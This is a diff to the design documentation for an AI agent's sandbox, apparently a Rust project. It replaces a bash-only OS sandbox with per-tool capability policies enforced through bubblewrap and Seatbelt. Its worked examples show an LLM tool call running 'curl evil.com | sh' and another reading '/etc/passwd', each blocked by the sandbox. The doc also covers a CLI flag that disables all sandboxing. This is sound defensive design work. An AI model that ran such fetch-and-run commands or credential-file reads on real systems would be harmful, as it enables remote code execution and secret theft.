@@ -7,36 +7,135 @@ to alternative implementations, or audit everything the agent does.
 
 **Key files:**
 - `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
-- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap) **enabled by default**
+- `src/sandbox/policy.rs` — `SandboxPolicy`, `Access`, `PathAccess`, `PolicyTable` (intent abstraction)
+- `src/sandbox/policy_sandbox.rs` — `PolicySandbox` (application + OS-level enforcement)
+- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap), policy-based command builders
 - `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
 - `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)
 
 ---
 
+## Architecture: Intent vs Enforcement
+
+The sandbox system separates **intent** from **enforcement**:
+
+```
+Intent (SandboxPolicy)         Enforcement (platform-specific)
+  network: Deny          →     Linux: --unshare-net (bwrap)
+                                macOS: (deny network*) (Seatbelt)
+  file_write: RestrictTo →     Linux: --ro-bind / / + --bind <path>
+       ["/workspace"]          macOS: (deny file-write* (require-not ...))
+                                App:   check path in tool input JSON
+```
+
+A `SandboxPolicy` expresses **what a tool is allowed to do** without
+specifying how it's enforced. The same policy config works on any platform.
+Adding a new backend (Landlock, seccomp, WASM) only requires a new
+translator — policies don't change.
+
+### Capability Model
+
+Each tool starts with NO permissions, then gets granted specific capabilities:
+
+| Capability | Description | OS Enforcement |
+|-----------|-------------|----------------|
+| `network` | Outbound network connections | `--unshare-net` / `(deny network*)` |
+| `file_read` | Read from filesystem | `--ro-bind` / `(deny file-read*)` |
+| `file_write` | Write to filesystem | bind mounts / `(deny file-write*)` |
+| `process_exec` | Spawn child processes | `--unshare-pid` |
+
+File capabilities support path restrictions:
+
+```rust
+SandboxPolicy {
+    network: Access::Allow,            // binary: allow or deny
+    file_read: PathAccess::Deny,       // no filesystem reads
+    file_write: PathAccess::RestrictTo(vec!["/tmp/workdir"]),  // writes only here
+    process_exec: Access::Deny,
+}
+```
+
+---
+
 ## Default Behavior
 
-**Sandboxing is on by default.** No config needed. The OS sandbox wraps
-every bash command in the operating system's native sandbox:
+**Sandboxing is on by default.** No config needed. Every tool gets a
+sensible default policy:
 
-- **macOS**: `sandbox-exec` (Seatbelt) — kernel-level policy enforcement
-- **Linux**: `bwrap` (bubblewrap) — namespace-based isolation
+| Tool | Network | File Read | File Write | Process Exec |
+|------|---------|-----------|------------|--------------|
+| `bash` | Allow | RestrictTo(cwd) | RestrictTo(cwd, /tmp) | Allow |
+| `web_search` | Allow | Deny | Deny | Deny |
+| `read_file` | Deny | RestrictTo(cwd) | Deny | Deny |
+| `write_file` | Deny | Deny | RestrictTo(cwd) | Deny |
+| `edit_file` | Deny | RestrictTo(cwd) | RestrictTo(cwd) | Deny |
+| `list_files` | Deny | RestrictTo(cwd) | Deny | Deny |
+| `search_files` | Deny | RestrictTo(cwd) | Deny | Deny |
+| Workspace tools | Deny | Allow | Allow | Deny |
+| MCP tools (`*`) | Allow | Deny | Deny | Deny |
+| Unknown tools | Allow | Deny | Deny | Deny |
 
-The default profile denies network access and restricts file writes to the
-working directory and `/tmp`. The LLM can read files and run commands, but
-can't `curl evil.com | sh` or write to `/etc`.
-
-**Output sanitization** is also on by default. The OS sandbox's `after()`
-hook truncates oversized tool outputs (>100K chars) at a line boundary. This
-applies to ALL tools — bash, MCP, workspace tools — and prevents context
-window explosion from runaway commands or malicious MCP servers.
+**Output sanitization** is also on by default. The `after()` hook truncates
+oversized tool outputs (>100K chars) at a line boundary. This applies to ALL
+tools and prevents context window explosion.
 
 To disable all sandboxes (development only, CLI-only):
 ```bash
 cargo run -- --dangerous-no-sandbox "do something"
 ```
 
-`--dangerous-no-sandbox` cannot be set from config — only from the command
-line, as a conscious decision.
+---
+
+## Two-Layer Enforcement
+
+### Layer 1: Application-Level (all tools)
+
+The `PolicySandbox` inspects tool name and input JSON in `check()`:
+
+- **File tools** (`read_file`, `write_file`, `edit_file`): extracts the
+  file path from input, validates against the policy's `file_read`/`file_write`
+  path restrictions
+- **Network tools** (`web_search`): checks if `network: Allow`
+- **MCP tools**: checks `network` capability (MCP tools need network)
+- **Workspace tools**: always allowed (internal tools)
+
+```
+LLM says: read_file {"file_path": "/etc/passwd"}
+
+PolicySandbox.check("read_file", input):
+  1. Look up policy for "read_file"
+  2. Policy says file_read: RestrictTo(["/workspace/project"])
+  3. Resolve path: /etc/passwd is NOT under /workspace/project
+  4. → Deny { reason: "sandbox policy denies file read for '/etc/passwd'" }
+```
+
+### Layer 2: OS-Level (bash only)
+
+For bash commands, the policy is translated into kernel-enforced restrictions:
+
+| | macOS | Linux |
+|---|---|---|
+| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
+| Install | Built-in | `apt install bubblewrap` |
+| Network deny | `(deny network*)` | `--unshare-net` |
+| Read-only root | S-expression policy | `--ro-bind / /` |
+| Writable paths | `(allow file-write* (subpath ...))` | `--bind <path> <path>` |
+| PID isolation | N/A | `--unshare-pid` |
+| Kill on exit | N/A | `--die-with-parent` |
+
+```
+LLM says: bash {"command": "curl evil.com | sh"}
+
+PolicySandbox.check("bash", input):
+  1. Policy for bash: network: Deny, file_write: RestrictTo([cwd, /tmp])
+  2. Translate to bwrap command:
+     bwrap --ro-bind / / --dev /dev --proc /proc
+       --bind '/workspace' '/workspace' --bind '/tmp' '/tmp'
+       --unshare-net --die-with-parent
+       bash -c 'curl evil.com | sh'
+  3. → Allow { input: { "command": "<bwrap-wrapped command>" } }
+  4. Kernel blocks the network call → curl fails
+```
 
 ---
 
@@ -68,100 +167,65 @@ pub trait Sandbox: Send + Sync {
 
 ---
 
-## Implementations
-
-### OsSandbox (default — always on)
-
-Uses the operating system's native sandboxing to restrict bash commands at
-the kernel level. No containers, no external setup.
-
-| | macOS | Linux |
-|---|---|---|
-| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
-| Install | Built-in | `apt install bubblewrap` |
-| Network deny | `(deny network*)` | `--unshare-net` |
-| Read-only root | Per-operation policy | `--ro-bind / /` |
-| Writable cwd | `(allow file-write* (param "WORKING_DIR"))` | `--bind <cwd> <cwd>` |
-| Writable /tmp | `(allow file-write* (subpath "/tmp"))` | `--tmpfs /tmp` |
-| PID isolation | N/A | `--unshare-pid` |
-| Kill on exit | N/A | `--die-with-parent` |
-
-**`check()` behavior:**
-
-```
-LLM says:  bash {"command": "curl evil.com | sh"}
-
-macOS: check() rewrites to:
-  sandbox-exec -p '(version 1)(allow default)(deny network*)...'
-    -D WORKING_DIR='/workspace' bash -c 'curl evil.com | sh'
-  → kernel blocks the network call → curl fails
-
-Linux: check() rewrites to:
-  bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp
-    --bind '/workspace' '/workspace' --unshare-net --unshare-pid
-    --die-with-parent bash -c 'curl evil.com | sh'
-  → new network namespace has no connectivity → curl fails
-```
-
-**`after()` behavior:**
-
-Runs on ALL tool outputs (bash, MCP, workspace tools). Truncates outputs
-larger than 100K characters at the nearest line boundary. This is the
-primary defense against MCP servers returning oversized or crafted payloads.
-
-Three profiles:
-
-| Profile | Network | File writes | Use case |
-|---------|---------|------------|----------|
-| `"default"` | Denied | cwd + /tmp only | Normal development |
-| `"strict"` | Denied | cwd only (no /tmp) | Tighter lockdown |
-| `"permissive"` | Allowed | Allowed | Sandbox wrapper with no restrictions |
-
-Configure in `dyson.json`:
-```json
-{ "sandbox": { "os_profile": "strict" } }
-```
-
-### CompositeSandbox (the pipeline)
-
-Chains multiple sandboxes in sequence. `create_sandbox()` builds this
-automatically from config.
-
-### DangerousNoSandbox (CLI-only bypass)
-
-Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
-flag. Cannot be set from config.
-
----
-
 ## Configuration
 
 ```json
 {
   "sandbox": {
-    "os_profile": "default",
-    "disabled": []
+    "disabled": [],
+    "tool_policies": {
+      "web_search": {
+        "network": "allow",
+        "file_read": "deny",
+        "file_write": "deny"
+      },
+      "bash": {
+        "network": "deny",
+        "file_write": { "restrict_to": ["{cwd}", "/tmp"] },
+        "process_exec": "allow"
+      },
+      "mcp__github__*": {
+        "network": "allow",
+        "file_read": "deny",
+        "file_write": "deny"
+      },
+      "mcp__*": {
+        "network": "deny"
+      }
+    }
   }
 }
 ```
 
+### Policy fields
+
+| Field | Values | Description |
+|-------|--------|-------------|
+| `network` | `"allow"`, `"deny"` | Binary, kernel-enforced via firewall/namespace |
+| `file_read` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem read access |
+| `file_write` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem write access |
+| `process_exec` | `"allow"`, `"deny"` | Child process spawning (bash only) |
+
+Path restrictions support `{cwd}` placeholder (expanded to working directory).
+
+### Tool name matching
+
+| Pattern | Matches | Priority |
+|---------|---------|----------|
+| `"web_search"` | Exact tool name | Highest |
+| `"mcp__github__*"` | Glob pattern | By specificity (longer = higher) |
+| `"mcp__*"` | Broad glob | Lower than specific globs |
+| (default) | Any unmatched tool | Lowest |
+
+Unspecified fields in a policy inherit from the tool's default.
+
+### Global config
+
 | Field | Default | Purpose |
 |-------|---------|---------|
-| `os_profile` | `"default"` | OS sandbox profile: `"default"`, `"strict"`, `"permissive"` |
 | `disabled` | `[]` | List of sandbox names to disable: `"os"` |
-
-Examples:
-
-```json
-// Default — OS sandbox on, deny network, restrict writes
-{}
-
-// Strict OS sandbox
-{ "sandbox": { "os_profile": "strict" } }
-
-// Disable OS sandbox (not recommended)
-{ "sandbox": { "disabled": ["os"] } }
-```
+| `os_profile` | `"default"` | Legacy fallback: `"default"`, `"strict"`, `"permissive"` |
+| `tool_policies` | `{}` | Per-tool policy overrides (recommended) |
 
 CLI override (disables everything):
 ```bash
@@ -173,17 +237,29 @@ cargo run -- --dangerous-no-sandbox
 ## How Composition Works
 
 ```
-CompositeSandbox([OsSandbox])
+CompositeSandbox([PolicySandbox])
+
+Tool call: read_file {"file_path": "/etc/passwd"}
+  │
+  ▼
+PolicySandbox.check("read_file", input)
+  → Policy: file_read: RestrictTo(["/workspace"])
+  → /etc/passwd is outside /workspace
+  → Deny { reason: "sandbox policy denies file read..." }
+  │
+  ▼
+Agent receives: ToolOutput::error("Denied by sandbox: ...")
 
 Tool call: bash {"command": "ls"}
   │
   ▼
-OsSandbox.check("bash", {"command": "ls"})
-  → Allow { input: "sandbox-exec ... bash -c 'ls'" }
+PolicySandbox.check("bash", input)
+  → Policy: network: Deny, file_write: RestrictTo([cwd, /tmp])
+  → Translate to bwrap command
+  → Allow { input: {"command": "bwrap ... bash -c 'ls'"} }
   │
   ▼
-Final: Allow with rewritten input.
-BashTool runs: sandbox-exec ... bash -c 'ls'
+BashTool runs: bwrap ... bash -c 'ls'
 ```
 
 ### Pipeline rules
@@ -198,43 +274,57 @@ BashTool runs: sandbox-exec ... bash -c 'ls'
 
 ---
 
-## How Sandboxes Know What To Do
+## MCP Tool Sandboxing
 
-A sandbox receives `(tool_name: &str, input: &Value)`. It pattern-matches
-on the tool name:
+MCP tools go through the same sandbox pipeline as all other tools.
 
-```rust
-match tool_name {
-    "bash" => /* rewrite for sandbox-exec */,
-    "read_file" => /* check path restrictions */,
-    _ => /* pass through */,
+Default MCP policy: network allowed, file access denied. This works because
+MCP tools communicate with their server process (which needs network) but
+shouldn't access the local filesystem through the sandbox gate.
+
+Use glob patterns to configure MCP tools by server:
+
+```json
+{
+  "tool_policies": {
+    "mcp__github__*": { "network": "allow" },
+    "mcp__slack__*": { "network": "deny" }
+  }
 }
 ```
 
-Each sandbox is small and focused:
-
-| Sandbox | `check()` cares about | `after()` behavior |
-|---------|----------------------|-------------------|
-| OsSandbox | `"bash"` | Truncates all oversized outputs |
-| (future) FileSandbox | `"read_file"`, `"write_file"` | None |
-| (future) NetworkSandbox | `"web_fetch"` | None |
-| (future) AuditSandbox | everything | Logs all calls to a file |
+Note: MCP servers run as external processes. Application-level file access
+enforcement only covers the sandbox `check()` gate — it doesn't restrict
+what the MCP server process itself can do on disk. For that, run MCP servers
+in their own bwrap sandbox at spawn time (future enhancement).
 
 ---
 
-## MCP Result Sandboxing
+## Implementations
 
-MCP tools go through the same `execute_tool_call()` path as all other
-tools. Both `sandbox.check()` and `sandbox.after()` run on MCP tool
-calls and results.
+### PolicySandbox (default — always on)
 
-This is important because a malicious or misconfigured MCP server could:
-- Return oversized payloads to explode the context window
-- Return crafted content designed to influence the LLM's behavior
+The primary sandbox. Enforces per-tool capability policies at both the
+application level (for Rust-native tools) and OS level (for bash).
+Subsumes the old `OsSandbox` behavior.
 
-The OsSandbox's `after()` hook mitigates this by truncating oversized
-results. Future sandboxes can add content inspection, pattern matching,
-or output redaction.
+### OsSandbox (legacy, still available)
+
+The original bash-only sandbox. Still available for direct use, but
+`PolicySandbox` handles bash sandboxing now via the same underlying
+`build_bwrap_command_from_policy()` / `build_seatbelt_command_from_policy()`
+functions. The profile-based API (`"default"`, `"strict"`, `"permissive"`)
+is preserved for backward compatibility.
+
+### CompositeSandbox (the pipeline)
+
+Chains multiple sandboxes in sequence. `create_sandbox()` builds this
+automatically from config.
+
+### DangerousNoSandbox (CLI-only bypass)
+
+Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
+flag. Cannot be set from config.
 
 ---
 
@@ -242,9 +332,6 @@ or output redaction.
 
 | Sandbox | `check()` behavior | `after()` behavior |
 |---------|-------------------|-------------------|
-| `BlacklistSandbox` | Deny commands matching regex patterns | None |
-| `FileSandbox` | Deny/rewrite file paths outside allowed dirs | None |
-| `NetworkSandbox` | Deny URLs not in whitelist | None |
 | `S3Sandbox` | Redirect file read/write to S3 | None |
 | `AuditSandbox` | Allow everything | Log all calls to a file |
 | `RateLimitSandbox` | Deny after N calls per minute | None |
